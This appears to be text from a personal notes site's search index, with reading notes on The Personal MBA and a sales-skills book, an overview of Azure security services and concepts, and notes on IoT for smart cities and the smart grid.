things that naturally overcomes our tendency to conserve - if you want something that's scarce, you can't afford to wait without the risk of losing what you want. Limited quantities Price increases Deadlines Novelty - the presence of new sensory data - is critical if you want to attract and maintain attention over a long period of time. One of the reasons people can focus on playing games or surfing the Internet for hours at a time is novelty - every new viral video, blog post, Facebook update, Twitter post and news report reengages our ability to pay attention. Even the most remarkable object of attention gets boring over time. Continue to offer something new, and people will pay attention to what you have to offer. Monoidealism is the state of focusing your energy and attention on only one thing, without conflicts. Monoidealism is often called a 'flow' state We are what we repeatedly do. Excellence, then, is not an act, but a habit. No decision, large or small, is ever made with complete information. Since we can't predict the future, we often attribute the feeling of indecisiveness to a lack of information. Externalization takes advantage of our perceptual abilities in a very intelligent way. There are two primary ways to externalize your thoughts: writing and speaking. Counter-factual Simulation as applied imagination - you're consciously posing a 'what if' or 'what would happen if' question to your mind, then sitting back and letting your brain do what it does best. A doomsday Scenario is a counterfactual simulation where you assume everything that can go wrong does go wrong. Caveman Syndrome makes our ancient brains over dramatic, so they assume every potential threat is a life-or-death situation. Excessive Self-Regard Tendency is the natural tendency to overestimate your own abilities, particularly if you have little experience with the matter at hand. Dunning-Kruger effect: Incompetent individuals tend to overestimate their own level of skills Incompetent individuals fail to recognize genuine skill in others Incompetent individuals fail to recognize the extremity of their inadequacy If they can be trained to substantially improve their own skill level, these individuals can recognize and acknowledge their own previous lack of skill Confirmation Bias is the general tendency for people to pay attention to information that supports their conclusions and ignore information that doesn't. Looking for not confirming information is uncomfortable, but it's useful, whatever you ultimately decide. hindsight Bias is the natural tendency to kick yourself for things you 'should have known'. It's important to realize that these feelings are irrational - your decisions were based on the best information you had at the time, and there's nothing you can do now to change them. Understanding your Locus of Control is being able to separate what you can control (or strongly influence) from what you can't. Trying to control things that aren't actually under your control is a recipe for eternal frustration. Focus most of your energy on things that you can influence, and let everything else go.","title":"Mind"},{"location":"2018/the_personal_mba/#relationship","text":"All human relationships are based on Power - the ability to influence the actions of other people. We don't have direct access to the inner processes that make people do the things they do. All we can really do is act in ways that encourage people to do what we suggest. On the whole, influence is much more effective than compulsion. Comparative Advantage means it's better to capitalize on your strengths than to shore up your weaknesses. Focus on what you can do well, and work with others to accomplish the rest. Golden Trifecta: Appreciation Courtesy Respect Treating other people poorly sends a clear signal to everyone that you can't be trusted. Humans are predisposed to look for behavioral causes. People will be more receptive to any request if you give them a reason why. Any reason will do. Commander's Intent is a much better method of delegating tasks: whenever you assign a task to someone, tell them why it must be done. The more your agent understands the purpose behind your actions, the better they'll be able to respond appropriately when the situation changes. Accountability is about one person taking responsibility. If two people are accountable for the same decision, no one is really accountable. Bystander Apathy is an inverse relationship between the number of people who could take action and the number of people who actually choose to act. The more people available, the less responsibility each member of the crowd feels to do anything about the situation. Pygmalion Effect: Let others know you expect great work from them, and they'll do their best to live up to your expectation. The Attribution Error means that when others screw up, we blame their character; when we screw up, we attribute the situation to circumstances. A compromise is the art of dividing a cake in such a way that everyone believes he has the biggest piece - Ludwig Erhard Common Ground is a state of overlapping interests between two or more parties. Negotiation is the process of exploring different options to find Common Ground. The more potential paths you explorer, the greater the chance you'll be able to find one in which your interests overlap.

When they have an issue, they go online to research their problem. Buyers self-educate, leaving the seller totally out of the loop. Without deep buyer understanding, it's increasingly difficult to get business. You're dealing with educated people who want conversations and collaboration, not pitches of any sort. Table of Contents Reframing Failures Turn the sales problem into a challenge rather than a personal problem. Neuroscience research shows that when you make a mental shift to view obstacles as opportunities, your brain is reenergized. When a competitor wins a deal, agile sellers refuse to see themselves as the losers. Failure isn't one bit personal. Failure is a nature part of the learning process. If you're struggling, you're not failing. You just haven't learned it yet. Setup the right goals While it's admirable to strive for the stars, research shows that big goals can actually be a hindrance, especially before you've achieved a level of proficiency. Rapid learning Breaking new info down into discrete chunks Searching for the 'minimum effective dose' The goal is to find the least amount of work needed to produce outstanding results fast You know what buyers pick as the differentiator in their decisions? The sales experience itself. To become the differentiator, you need to always be learning. We need to provide value in every conversation and manage the customer experience. Learning agility is your only sustainable competitive advantage. Understand Buyers Understanding who you're selling to is far more important than what you're selling! People, not organization, make decisions. Selling is and always will be about dealing with people. That's why it's so crucial to be conscious of our impact on them. Everything we do either draws them toward us or moves them further away. The more you know about what makes your buyers tick, the better off you'll be. Start by finding out who is involved in making decisions. Once you nail down the positions, you need to understand their roles and responsibilities, objectives, motivations, status quo, and challenges. This essential info helps you: Craft relevant, enticing messages Plan customer-engaging meetings Help people make the right decisions Differentiate yourself from competitors Buyer's matrix Position Roles/responsibilities: what are they in charge of or expected to manage? Business objectives and metrics: what do they want to achieve? How do they measure success? How are they evaluated? Strategic initiatives: what likely strategies and initiatives are in place to help them achieve their objectives? Internal challenges: what likely issues does the organization face that could prevent/hinder goal achievement? External challenges: what external factors or industry trends might make it more difficult to reach their objectives? Primary interfaces: who do they frequently interact with (e.g. peers, subordinates, superiors, and external resources)? Status quo: what's their status quo relative to your product or service? Change drivers: what would cause them to change from what they're currently doing? Change inhibitors: what would cause them to stay with the status quo, even if they're unhappy? Embrace the status quo The truth is, the status quo is your biggest competitor. Your prospects don't want to change how they're doing things. Ask questions: How do our targeted prospects do things without us? What problems might they be encountering with their current way of doing thing? How do these problems impact efficiencies? Costs? Revenue? Other departments? What effect does this status quo have on achieving their objectives? What's the business case of making a change? What issues might arise if they're doing it themselves? Immerse yourself in the status quo. Search for its weakness, shortcomings, and gaps. Once you have a working knowledge of your biggest competitor - the status quo - you'll be able to have more intelligent conversations with your prospects. Business case Many companies fail to arm their sellers with a strong business case. They still believe that their products or services sell themselves. Don't tell wrong story. Focus area should not be own company's story, and miss client's story. Interview your customers One of the best things you can do to learn why people buy your products or services is to interview your own customers. Don't be shy about this. You/ll be amazed at what you can learn and just how valuable it can be in your sales initiatives. Be aware that you may occasionally run into an unhappy customer. If so, listen carefully to their issues and don't be defensive. Find out what you can do to help. Believe it or not, people tell you a whole lot more over the phone than if you're face-to-face. And don't waste your time trying to do it via e-mail or online surveys; the response rate is low and the quality of info is poor. Make sure you plan your questions ahead of time. Otherwise, the conversation can wander all over the place and the answers you get won't be helpful. Consider recording your interview too, so that you can listen to it again for insights you might have missed the first time.

Learn the lingo Company Industry Financial Other Sales Toolkit The key to long-term success is short-term success. No matter how long you've been in sales, there's always room for improvement. Ask yourself these questions to determine the best sales skills to focus on initially: Are you satisfied with your prospecting results? If not, you need to figure out what's causing your problems and how you can change Are enough of your initial conversations turning into serious discussions? If there's big drop-off, consider what you can do to get better results Do you lose to 'no decision' frequently?

Perhaps you could even say something like, 'you seem distracted', or 'it looks like you've got some hesitation about changing things here'. These honest statements and beneficial for both you and your prospect. Recovery strategy: 'Sorry, Mr prospect. Sometimes I just get so excited about how we might be able to help. But I really don't know enough about your business yet. Let's get back to talking about those challenges you mentioned earlier. One of the biggest fails of all - interested people who stay with the status quo. If this is happening to you, it's crucial to ask yourself: Why don't they see the value of change? How can I build a stronger business case? What questions could I ask to help them realize the cost of sticking with the status quo? Am I rushing to a solution too quickly? People won't buy unless they believe that changing is worthwhile. That's the real issue. No matter how much training your sales team gets on closing, it won't address the root cause of their problem. Optimize time usage Make various checklists to help you remember things To ensure that you get the right work done in the shortest possible time - and as soon as possible - try the following strategies for power-packing your day: Prioritize daily Chunk your time Set deadlines Avoid multi-tasks to upgrade your brain Check email on a schedule - 3 - 4 times per day Protect yourself from yourself: stay focus Totally disconnect Top sellers spend more time prepping for meetings than average sellers, at every point in their careers. They still role-play. They debrief regularly. They exchange ideas with their colleagues. While your time is a finite resource, your energy level is a renewable one. Take time out to think and reflect, by yourself. Fast Growth Make your own personal growth and development the number-one priority. It seems strange to recommend teaching others while you're still learning yourself. After all, we so quickly defer to the experts. However, the upside can be huge. As the Roman philosopher Seneca wrote nearly two thousand years ago, 'by teaching, we learn' Gaming the system The objection game: whenever I encounter an objection that stumps me, I turn it into a game The competitive game: whenever I'm up against a known competitor, I approach it like a chess game. The one-customer game: I take a look at my best customer and ask, \"if this were the only company I could work with, what would I need to do to earn a decent living here?\" Here are some ways you can build more grit: Focus on what's controllable Challenge yourself Take a break Fake it till you make it Prior to making an important call, stand up and assume a power pose If you're waiting to go into a big meeting, stop by the restroom before it starts and assume a power pose in privacy When you're sitting in a lobby, take over the chair. Spread out while you wait While giving a presentation, stand tall and use bigger gestures. Think of someone you can emulate. Repeat a personal mantra that makes you feel more powerful Never go behind someone's back If you need to meet with people other than the person you're currently working with, make sure you find a valid reason for it and. If possible, engage your current contact in setting it up. Hope is rampant in sales. We need it to keep going - but we also need to avoid being fooled by false hope. The longer a deal stays in your pipeline, the less likely you are to ever close it, even if your prospect claimed that he or she desperately needed your offering. If the sales process does get stalled out, the only person who loses is you. Purge your pipeline.

As the Roman philosopher Seneca wrote nearly two thousand years ago, 'by teaching, we learn' Gaming the system The objection game: whenever I encounter an objection that stumps me, I turn it into a game The competitive game: whenever I'm up against a known competitor, I approach it like a chess game. The one-customer game: I take a look at my best customer and ask, \"if this were the only company I could work with, what would I need to do to earn a decent living here?\" Here are some ways you can build more grit: Focus on what's controllable Challenge yourself Take a break Fake it till you make it Prior to making an important call, stand up and assume a power pose If you're waiting to go into a big meeting, stop by the restroom before it starts and assume a power pose in privacy When you're sitting in a lobby, take over the chair. Spread out while you wait While giving a presentation, stand tall and use bigger gestures. Think of someone you can emulate. Repeat a personal mantra that makes you feel more powerful Never go behind someone's back If you need to meet with people other than the person you're currently working with, make sure you find a valid reason for it and. If possible, engage your current contact in setting it up. Hope is rampant in sales. We need it to keep going - but we also need to avoid being fooled by false hope. The longer a deal stays in your pipeline, the less likely you are to ever close it, even if your prospect claimed that he or she desperately needed your offering. If the sales process does get stalled out, the only person who loses is you. Purge your pipeline.

It's important to think of security in layers rather than a single protection element. Defense in Depth: The best security is based on layers of protection and this is especially true with networking. See following picture. It's also important to ensure security while not crippling the business ability to operate. Make security a core step of any new project, of change control, of anything you do. Key Security Areas +---------------------------+-----------------------------------------------+ | Identity and access | Being sure you are who you say you are | +---------------------------+-----------------------------------------------+ | Network security | Secure access, isolation, and publishing | +---------------------------+-----------------------------------------------+ | Data protection | Encryption of data at rest and in transit | +---------------------------+-----------------------------------------------+ | Protecting secrets | Keys, certificates, credentials | +---------------------------+-----------------------------------------------+ | System integrity | Patched, protected, etc | +---------------------------+-----------------------------------------------+ | Insight | Auditing, system state, health | +---------------------------+-----------------------------------------------+ Security terminology +----------------+-------------------------------------------------------------------------------+ | Asset | People, property, or information (database, software code, company records) | +----------------+-------------------------------------------------------------------------------+ | Threat | Person or process that can exploit a vulnerability (intentionally or | | | accidentally) to obtain, damager, or destroy an asset | +----------------+-------------------------------------------------------------------------------+ | Vulnerability | Weakness or gap in a security program that can be exploited by threats to | | | gain unauthorized access to an asset | +----------------+-------------------------------------------------------------------------------+ | Risk | The potential for loss, damage, or destruction of an asset as a result of a | | | threat exploiting a vulnerability | +----------------+-------------------------------------------------------------------------------+ Azure security services overview Identity and Access Azure Role Based Access Control Azure Active Directory /B2C/B2B Azure Multi-Factor Authentication Hybrid identity with Microsoft Azure: Microsoft\u2019s identity solutions span on-premises and cloud-based capabilities, creating a single user identity for authentication and authorization to all resources, regardless of location. Network Security Network Security Groups: While Virtual Network (VNET) is the cornerstone of Azure networking model and provides isolation and protection. Network Security Group (NSG) is the main tool you need to use to enforce and control network traffic rules at the networking level. Customers can control access by permitting or denying communication between the workloads within a virtual network, from systems on customer\u2019s networks via cross-premises connectivity, or direct Internet communication. Azure VPN Gateway: A VPN gateway is a specific type of virtual network gateway that is used to send encrypted traffic between an Azure virtual network and an on-premises location over the public Internet. Azure Application Gateway: Azure Application Gateway is a web traffic load balancer that enables you to manage traffic to your web applications. Azure Load Balancer: With Azure Load Balancer, you can scale your applications and create high availability for your services. Azure Traffic Manager: Azure Traffic Manager is a DNS-based traffic load balancer that enables you to distribute traffic optimally to services across global Azure regions, while providing high availability and responsiveness. Azure Application Proxy: Azure Active Directory's Application Proxy provides secure remote access to on-premises web applications. After a single sign-on to Azure AD, users can access both cloud and on-premises applications through an external URL or an internal application portal. Route Control and Forced Tunneling: Forced tunneling lets you redirect or \"force\" all Internet-bound traffic back to your on-premises location via a Site-to-Site VPN tunnel for inspection and auditing. Virtual Network Security Appliances: Use your favorite network virtual appliances in Azure Azure Virtual Network: Your private network in the cloud Express Route: Experience a faster, private connection to Azure Internal DNS & Azure DNS Data Protection Azure Storage Security Azure Storage Service Encryption (for data at rest) StorSimple Encrypted Hybrid Storage (an integrated storage solution that manages storage tasks between on-premises devices and Azure cloud storage.) Azure Client-Side Encryption Azure Storage Shared Access Signatures Azure Storage Account Keys Azure File Shares with SMB 3.0 Encryption: The Server Message Block (SMB) protocol is a network file sharing protocol that allows applications on a computer to read and write to files and to request services from server programs in a computer network. The SMB protocol can be used on top of its TCP/IP protocol or other network protocols. Using the SMB protocol, an application (or the user of an application) can access files or other resources at a remote server. This allows applications to read, create, and update files on the remote server. It can also communicate with any server program that is set up to receive an SMB client request. Azure Storage Analytics Role-based access control (RBAC) Encryption in Transit Enabling Browser-based clients using CORS Do not copy production db, but use SQL DB Data Masking Backup and Disaster Recovery Azure Backup Azure Site Recovery Azure Database Security Azure SQL Firewall Azure SQL Authentication Azure SQL Transparent Data Encryption: Transparent Data Encryption (TDE) encrypts SQL Server, Azure SQL Database, and Azure SQL Data Warehouse data files, known as encrypting data at rest. Azure SQL Database Auditing Protecting secrets Azure Key Vault System integrity Applications Web Application vulnerability scanning Penetration testing Web Application firewall (WAF) Layered Security Architecture Web server diagnostics and application diagnostics Antimalware & Antivirus Hardware Security Module Virtual machine backup VM Disk Encryption (IaaS VM disk) Patch updates Security policy management and reporting Insight Operations Management Suite Security and Audit Dashboard Azure Resource Manager Application Insights Azure Monitor Log Analytics Azure Advisor Azure Security Center Authentication Options Authentication in the Public cloud Communication over the public cloud has to be focused on protocols commonly available. HPPTS is preferred and often required because it is encrypted with SSL. Authentication commonly used: OAuth OAuth 2 (used by Azure AD) SAML Azure Active Directory Provide access to web-based services Identity infrastructure of the future Expanding constantly Limited but growing features Limited control over user environment Active Directory Domain services Access to on-premises resources Current and past identity infrastructure Been pretty constant for over a decade Full featured implementation Infrastructure is built and maintained Fine-grain control of user environment Applications within the configured virtual network can leverage Azure AD in a similar way to AD DS (LDAP, join domain, Kerberos, NTLM) Useful where AD DS needed but don't want the management or cost of traditional AD DS Custom domain name To simplify the full name of azure AD url Verify through your own hosting website (e.g. hostmonster) Azure AD Connect Azure AD Connect tool is to connect the local AD to Azure AD. And you can activate or deactivate the sync between Azure AD and local AD. Azure AD Connect !== AD Federation Privileged Identity management: Azure AD P2 No standing privileges is a common security goal. Ideally accounts have privileges elevated only when required. Azure AD Privileged Identity Management (PIM) enables users/groups to have roles assigned. The user must then request elevation, typically also with MFA along with an optional comment. The elevation is for a configurable amount of time per role. A big focus is for a single identity across all systems and clouds. It is critical that the identity is as secure and monitored as possible. Azure AD Identity Protection provides a centralized view of risk events, risk users and vulnerabilities. Can be utilized as part of conditional access to add user risk level as a condition. Typical Capabilities Browser Based Authentication Mobile Device Authentication Multi-Factor Authentication Login to your corporate directory Single Sign On (to SaaS apps) Social Login Identity as a service How else does IDaaS help? DDOS prevention at the provider, not at your app User Management Block suspicious login Prompt for MFA Protocol based protection at the app (OpenlD Connect / OAuth2) Centralized user management Audit logs, reports Compliance Azure Key Vault An Azure resource provider backed by pools of hardware security modules (HSMs) Provides storage: Secrets - Pieces of data (under 25KB) that can be stored and retrieved Keys - Stored and then used within the key vault to perform cryptographic operations (but cannot be retrieved) Certificates - Management of x509 certificates including lifecycle Authentication and Authorization Authentication is via Azure AD OAuth2 tokens. Authorization is via Access Control List (ACL) on the key vault. Typical structure is as follows: Key Vault Owner; Key/Secret Owner; App Operator; Auditor Store your private keys, shared secrets, other connections, securely FIPS (Federal Information Processing Standard) compliant option HSM storage ($$) Examples: Private keys, certs, passwords; Connection strings; Secrets and account names for service bus, storage, search, redis, etc. Networking Connecting Virtual Networks If Virtual networks exist in the same region and use the same Azure AD tenant network peering can be used to connect them using the Azure backbone network Another option is to utilize site-to-site VPN or ExpressRoute where network peering is not possible Site-to-site VPN or ExpressRoute are used to connect to on-premises locations NSG Rules: Rules are based on 5-tuple and have priority and action (allow or deny) Source IP address (can be a range using CIDR format) Source port Destination IP address (can be a range using CIDR format) Destination port Protocol (TCP, UDP, or * ) Non-VNet Azure Services Most non-laaS services do not directly integrate with VNets The services have an Internet public facing endpoint Some services provide a configurable firewall to control access based on public IP address and if from an Azure service When enabling for Azure services it means any service for any tenant running in Azure If more granularity required, look to utilize a public IP from the source service and restrict based on that IP Virtual Appliances A large number of virtual appliances are available in the Azure Marketplace Licensing can be based on: Bring your own license or Hourly billing Essentially a VM with pre-configured software and configuration to perform a certain set of functionality Common examples include firewalls and load balancers Azure Application Gateway A layer 7 reverse-proxy solution Terminates the client connection and forwards requests to target Application protocols support HTTP, HTTPS and WebSockets Supports SSL termination (offloading the CPU from the endpoints) Internet facing and Internal (VNet) applications Provides a layer of abstraction from the requesting client and the back-end service Web Application Firewall Optional addition to Azure Applicaiton Gateway Provides a web application firewall solution Implements CRS 3.0 by default (2.2.9 also available) (Core Rule Set) Rules can be disabled on an individual basis if required Detection or prevention mode Some practices Logically segment subnets: use nsgs for inter-subnet traffic Control routing: used with virtual network applicances Enable forced trunneling: constrain outbound VM traffic Disable RDP/SSH: employ P2S or S2S VPNs Enable Azure Security Center: Prevent, detect, and respond to threats Other Services and practices Azure Security Center AAA: authentication, authorization, accounting SIEM (Security information and event management) Recommend actions to take to secure your VMS Define policies Export logs for analysis Integration with Operations Management System (OMS) Azure Trust center Compliance Requirements Infrastructure: ISO 27001, 0 SAS 70 Type Il, SSAE 16 Audit: Third party review/ NIST SP 800-53;

Connected devices can help reduce congestion on local roadways, alert the fire department in case of emergencies, and even signal the need for road maintenance or additional police patrols. The smart city might mean a smaller government \u2013 or a more intrusive one. It all depends. Introduction The IoT has a lot to offer municipalities of all size. In fact, there's a recognized smart city concept floating around, kind of a template or set of guidelines that cities across the United States and around the world can model going forward. The goals of the smart city are to make better use of public resources, increase the quality of services offered to citizens, and reduce operational costs of the public administrations. To achieve these goals, the smart city must deploy an infrastructure that provides simple and economical access to most if not all public services, including transportation and parking, lighting, utilities, surveillance and maintenance of public areas, and more. What does this theoretical smart city concept mean in practice? We're talking about all sorts of potential public benefits, including more efficient traffic flow, better management of public buildings and areas, reducing the (huge) costs of public lighting, better management waste removal and other public utilities, and more effective policing and emergency services. As with all IoT related activities, the smart city will be powered by data collected from smart devices of all shapes and sizes. All this data can also be used to increase the transparency of the local government, enhance the awareness of the public about the status of their city, and stimulate citizen's participation in the public administration. There are the obvious technical and financial challenges, of course (it's all rather complex and expensive to implement), but cities face additional political issues. With literally hundreds of billions of dollars in spending at stake, who makes the purchasing decisions? And who benefits from local and state contracts? Who makes the decision, especially when technology must necessarily bridge multiple adjacent municipalities? And how do governments deal with the privacy and security issues inherent with the massive level of data collection and de facto public surveillance. Once these challenges can be overcome (and they inevitably will be), expect your city to install thousands of sensors on local streets, parks, and buildings, the better to gather information about public usage, air quality, noise levels, and the like and then use the collected data to provide better and more efficient services. The future is bright for cities and citizens everywhere. Smart infrastructure A smart city starts with enhanced smart infrastructure. The IoT is built on the collection of various types of data, and the typical city offers a plethora of data just waiting to be collected. That means building out an infrastructure that includes the neccessary sensor devices, of various types, and a communication networks to link them all together. For instance, to properly monitor the continuing safety of a bridge requires a variety of sensor types, including temperature, humidity, vibration, and pressure sensors. In earthquake-prone regions, add seismic activity sensors and accelerometers to the list. All these sensors have to be connected to a central system that monitors data in real time and analyzes the historical data for trends. All the data is relevant, and all must be collated and analyzed. The challenge is deploying all the necessary sensors and then networking them together in an efficient manner. A city, then, must construct some sort of low-power wireless sensor network (WSN) to connect these and other sensors in the public purview. Another example. Instead of waiting for a citizen to complain about a pothole (typcially because he lost a hubcap while driving into the thing), smart sensors detect the presence of the hole and report it - complete with its location and size - to the central system. The system automatically enters the issue into its main database and assign repair to an appropriate street crew, prioritized based on location and severity. Police and other emergency responders also benefit from faster, smarter communications. Security systems are connected directly into the city's central system so that police are notified the instant an alarm goes off. Same things with firefighters. A smoke alarm goes off, the data get sent directly to the nearest fire department. Before they pull fire truck out of the station, they know where in the building the fire is active, the best route into and through the building, and what obstacles they might face. They also get the latest floor plans of the burning building, previously stored in their central database. Emergency medical technicians (EMT) also get smarter and more effective thanks to the IoT. When a call comes in, they receive data from any wearable medical devices on the citizen, as well as the person's complete medical history. The responders know what to expect before they ever get there and can thus be better prepared for that particular medical emergency. Whether it's a flood, tornado, snowstorm, or hurricane - or mass shooting, explosion, or terrorist attack - authorities will be better informed beforehand and experience more efficient communications in responding to the event. Smart Roads and Traffic management Cities, whether urban or suburban, have to deal with a lot of motorized vehicles. We're talking traffic control, road maintenance, parking management. It's a major headache. Smart parking If you live in a city of any decent size, you know how hard it is to find a parking place, especially during popular events. Wouldn't it be great if you knew exactly where the nearest open space was, so you wouldn't spend half your time driving around looking for it? Smart parking technology is out to solve this particular problem. Smart Traffic management Traffic itself can be a nightmare, with massive congestion commonplace in many metro areas. When you want to avoid traffic jams and minimize the number of red lights you have to stop at, it's time to turn to the IoT. By constantly monitoring traffic flow with its roadside sensors, the IoT's smart systems can manipulate traffic signals and even lane availability to make sure the greatest number of drivers get to their destinations with the least number of interruptions. What we'll get with the IoT is more sensors monitoring more cirtical points, providing a denser grid of data. Sensors can be embedded in roadways or installed street-side in traffic signals or light poles; different types of sensors will monitor different things, such as vehicle traffic, air quality, noise levels, and the like. Data can also be co-opted from drivers' smarthpones or smart cars. Manage traffic signals and other activities to keep cars moving as rapidly as legally possible and lots of good things result - drivers get where they're going faster, there are fewer accidents, road deterioration is minimized, and the air quality improves. It's all about Smart Transportation Systems (STS) Smart Roads Low-hanging fruit: it's easier to install a few sensors in a local roadway than it is to convert entire fleet of automobiles into self-driving vehicles. It's a combination of several different technologies all designed to better manage traffic flow and avoid congestion and accidents Glow-in-the-dark road markings: stripes and other markings made from paint that 'charge up' during daylight hours. The markings then glow green for up-to ten hours during the night Smart road lights: Lighted roadways are safer than dark stretches of highway, but it costs money to power all those lights. Smart roadway lighting use motion-sensing technology to tell when a car is approaching and then lights that section of highway. The lights grow brighter when a car comes closer and slowly dim as it passes. It's great technology for less-travelled roadways where lighting is valuable but not currently economically feasible. Wind-powered lighting: Wind-powered lights use roadside pinwheels to generate electricity, using wind drafts from passing cars. The pinwhells only revolve when cars speed by, thus lighting up the road ahead for them. In a way, it's self-powered lighting for and by the motorists themselves. Priority lane for electric vehicles: speaking of electricity, how about using the highway system to charge up our coming fleet of electric cars? Some experts are proposing the creation of induction priority lanes with embedded magnectic fields, designed to charge electric vehicles while they're on the go. Solar roadways Smart roadway displays: Instead of relying on the traditional overhead or side-of-road signs, we can use the solar panels embedded in our roadways to display information to drivers via light-emitting diodes (LED). In addtion to powering conventional road markings, imagine a roadway with lighted arrows alerting you to upcomming lane changes, numbers that display your speed or the posted speed limit, or words and letters that deliver important messages. It's very futuristic but potentially game-changing. Smart public lighting Public lighting is a big expense for most cities - approaching 20 percent of all electricity consumed. If that power consumption can be reduced by even a small amount, the savings can be considerable. Smart Utilities Many cities run at least some of their own utilities - water, waste management, even gas and electricity. Keeping costs down for both the city and its residents is an important challenge Smart Waste management In the IoT future, image a container with embedded sensors that detect how full the bin is and summons the truck only when necessary. This will reduce costs by optimizing the truck's route and make for more efficient collection. Smart water management Municipal water management is also a major source for IoT optimization. Right now, most cities still employ meter readers to walk through neighborhoods and take manual meter readings. Going forward, cities will install smart water meters with embedded sensors and radio-frequency (RF) transmitters to monitor individual household water consumption. By collecting real-time data, the water utility can notify customers (via phone, email, or text) if usage levels are unusual, thus warning of potential water leaks. The data will also provide cities with insight into overall usage trends on a neighborhood-by-neighborhood basis. Smart grid Another public utility that deserves even more attention is the electric compnay and the overall electric grid. Power usage can get a lot more effcient when we connect various smart devices to a new smart grid. It's a modernized electrical grid - the collection of power plants, transformers, and transmission lines that bring electricity to all the homes and businesses in a given area. Moving forward, we need a smarter grid, one built from the ground up to handle larger power loads - and better manage those loads. This new grid, the so-called smart grid, will use digital communications technology to collect and disseminate data about energy usage - the behaviors of both consumers and suppliers. That data can then be used to improve energy efficiency, helping consumers use less energy and save money. The smart grid will enable two-way communication between the utility and its customers, which will let smart home devices talk to the utility and make for more efficient energy usage. This new grid will also contain sensors along trasmission lines to better monitor power usage in all possible ways and respond more quickly to changing energy demand. Smarter energy management The last point means putting power where and when it's needed. More effcient distribution of the power load will result in fewer power outage and brownouts and, as power usage will be better-balanced, require less power overall. Power usage can also be managed by having the utility communicate with smart devices installed in homes and businesses. We're talking smart thermostats, smart appliances, and the like that can receive instructions from the power company and shift their usage to times with lower demand. For example, during a hot summer day when energy usage is peaking, the utility might send out instructions to cut power for nonessential operations, such as turning up the temperature for air conditioners and turning off appliances such as dishwashers and laundry equipment. This will not only help alleviate overall demand for electricity, but also lower usage rates. A self-healing grid Today, a small power outage quickly becomes a larger one, thanks to the domino effect of failures cascading along the line. Comapneis often don't know where problems lie until customers call in the complain. And it often takes an inordinate amount of time to repair the damage and bring blackened areas back online. A smart grid will better manage blackouts and damages, due to what the industry calls distributed intelligence. This involves capturing data at the 'edge' of the grid, where the electricity is consumed, by smart power meters and sensors in homes and businesses. By analyzing this data on the spot in real timem more information and faster decisions can be made, especially in emergency situations. Distributed intelligence will enable utilities to know about outages at the moment they occur, well before custoemrs call in. The power company will be able to quickly pinpoint the source of an outage so that repair crews can immediately be dispatched to the problem area. The smart grid will also enable utilities to better isolate power outages before they affect the rest of the grid, rerouting power paths around the problem area to keep the power flowing to the majority of customers. This will harden the entire system against all manner of emergencies, from severe storms to sunspot activity to terrorist attacks. In addition to minimizing the extend of an outage, the smart grid will also be more easily repairable. Service will be able to come back online more quickly after an emergency, with selective enabling - routing power to emergency services first. In this mannger, the smart grid becomes a self-healing distribution system. Collecting and using the data The power comapnies, of course, will take full advantage of all the data collected to more effectively manage their resources and infrastructure. Companies will get a better handle on customer energy usage and manage supply to better match this demand. All the data generated by the smart grid will (or at least should) be available to customers, too. The more you know about your own energy usage, the smarter you can be about what you use and how. You'll have access to real-time data about energy usage by time of day, and what devices exactly are using all the electricity. You'll also see how much that usage costs, which will help you save money by using less power when electricity is most expensive. Building the smart grid Creating a smart power grid is going to be a lot of work and cost a lot of money. The new smart grid will consist of millions of individuals pieces and parts - power lines, sensors, controls, computer systems, and the like. Not all neccessary technologies are widely available today; some are still in development and need extensive testing before being publicly deployed. It will take time for it all to come together. Consider the following technologies thought to be part and parcel of the smart grid: Integrated two-way communications, either via traditional wired networks, power-line networks, or wireless networks. These communications are necessary for real-time control, data collection and exchange and security. Sensing and measurement, to monitor electricity flow and equipment status, evaluate congestion and grid stability and prevent energy theft. All manner of sensors may be deployed, including those to measure voltage and wattage, ambient temperature and humidity, weather conditions, electromagnetic signature, energy leakage, and the like. Phasor measurement units (PMUs), high-speed sensors distributed throughout the entire transmission network to monitor the state of the system. These sensors take up to 30 measurements per second, representing the magnitude and phase of the alternating voltage at a given point in the network. PMUs enable automated system to quickly respond to evolving system conditions in a dynamic fashion, thus minimizing downtime and preventing further outages. Distributed power flow control, via devices that clamp onto transmission lines to control the flow of electricity. This technology provides more consistent, real-time control over how energy is routed within the grid, and to store customer-generated electricity. Smart meters: installed a customers' homes or businesses. Theses are digital meters (as opposed to the old mechanical ones) that monitor usage in real time and provide aumated transfer of information between the power company and customers' smart devices. Smart meters will also provide utilities with more data about how electricity is being used in individual localtion and throughout their service areas. Smart power generation, to match electricity production with demand by using generators that can start and stop idenpendently of other units. This is called load balancing and can be automated via the sensors, controls and systems of the smart grid. Intelligent control systems, capable of constant monitoring, instant diagnosis, and appropriate solutions to grid disruptions or outages. These systems will incorporate distributed intelligent agents, analytical tools and algorithms, and operational applications. To a large extend, the smart grid is being piecemealed together from these and other technologies. Some experts estimate that it will take at least a decade for all the pieces to come together - but when they do, we'll all see immediate and significant impact.

In fact, there's a recognized smart city concept floating around, kind of a template or set of guidelines that cities across the United States and around the world can model going forward. The goals of the smart city are to make better use of public resources, increase the quality of services offered to citizens, and reduce operational costs of the public administrations. To achieve these goals, the smart city must deploy an infrastructure that provides simple and economical access to most if not all public services, including transportation and parking, lighting, utilities, surveillance and maintenance of public areas, and more. What does this theoretical smart city concept mean in practice? We're talking about all sorts of potential public benefits, including more efficient traffic flow, better management of public buildings and areas, reducing the (huge) costs of public lighting, better management waste removal and other public utilities, and more effective policing and emergency services. As with all IoT related activities, the smart city will be powered by data collected from smart devices of all shapes and sizes. All this data can also be used to increase the transparency of the local government, enhance the awareness of the public about the status of their city, and stimulate citizen's participation in the public administration. There are the obvious technical and financial challenges, of course (it's all rather complex and expensive to implement), but cities face additional political issues. With literally hundreds of billions of dollars in spending at stake, who makes the purchasing decisions? And who benefits from local and state contracts? Who makes the decision, especially when technology must necessarily bridge multiple adjacent municipalities? And how do governments deal with the privacy and security issues inherent with the massive level of data collection and de facto public surveillance. Once these challenges can be overcome (and they inevitably will be), expect your city to install thousands of sensors on local streets, parks, and buildings, the better to gather information about public usage, air quality, noise levels, and the like and then use the collected data to provide better and more efficient services. The future is bright for cities and citizens everywhere.","title":"Introduction"},{"location":"2019/iot_for_smartcities/#smart-infrastructure","text":"A smart city starts with enhanced smart infrastructure.

